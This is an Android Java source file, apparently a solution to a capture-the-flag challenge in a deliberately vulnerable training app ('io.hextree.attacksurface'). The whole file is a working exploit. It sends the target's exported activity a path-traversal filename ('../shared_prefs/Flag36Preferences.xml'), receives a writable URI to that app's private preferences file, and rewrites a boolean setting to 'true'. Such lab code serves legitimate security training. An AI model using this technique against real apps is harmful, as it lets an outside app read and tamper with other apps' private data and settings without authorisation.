package niraj.patali.writewithfileprovider;

import android.content.ContentResolver;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.ParcelFileDescriptor;
import androidx.appcompat.app.AppCompatActivity;

import org.w3c.dom.Document;
import org.w3c.dom.Element;

import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.stream.StreamResult;

public class MainActivity extends AppCompatActivity {
    private static final String SERVICE_PROVIDER_PACKAGE = "io.hextree.attacksurface";
    private static final String SERVICE_PROVIDER_ACTIVITY = "io.hextree.attacksurface.activities.Flag35Activity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Request access to the service provider's file
        Intent intent = new Intent();
        intent.setClassName(SERVICE_PROVIDER_PACKAGE, SERVICE_PROVIDER_ACTIVITY);
        intent.putExtra("filename", "../shared_prefs/Flag36Preferences.xml");
        startActivityForResult(intent, 100);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        Uri fileUri = data.getData();

        if (fileUri != null) {
            modifyXMLFile(fileUri);
        }

    }

    private void modifyXMLFile(Uri fileUri) {
        ContentResolver resolver = getContentResolver();
        ParcelFileDescriptor pfd = null;

        try {
            // Step 1: Open the file descriptor for reading and parse the XML
            pfd = resolver.openFileDescriptor(fileUri, "r");
            if (pfd == null) return;

            InputStream inputStream = new ParcelFileDescriptor.AutoCloseInputStream(pfd);
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            DocumentBuilder builder = factory.newDocumentBuilder();
            Document document = builder.parse(inputStream);

            // Modify the XML content
            Element rootElement = document.getDocumentElement();
            Element booleanElement = (Element) rootElement.getElementsByTagName("boolean").item(0);
            if (booleanElement != null) {
                booleanElement.setAttribute("value", "true");
            }

            inputStream.close(); // Close the InputStream

            // Step 2: Open the file descriptor for writing
            pfd = resolver.openFileDescriptor(fileUri, "w");
            if (pfd == null) return;

            OutputStream outputStream = new FileOutputStream(pfd.getFileDescriptor());
            TransformerFactory transformerFactory = TransformerFactory.newInstance();
            Transformer transformer = transformerFactory.newTransformer();
            DOMSource source = new DOMSource(document);
            StreamResult result = new StreamResult(outputStream);

            // Write the updated XML back to the file
            transformer.transform(source, result);

            outputStream.close(); // Close the OutputStream
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            // Ensure the ParcelFileDescriptor is closed
            try {
                if (pfd != null) {
                    pfd.close();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

}
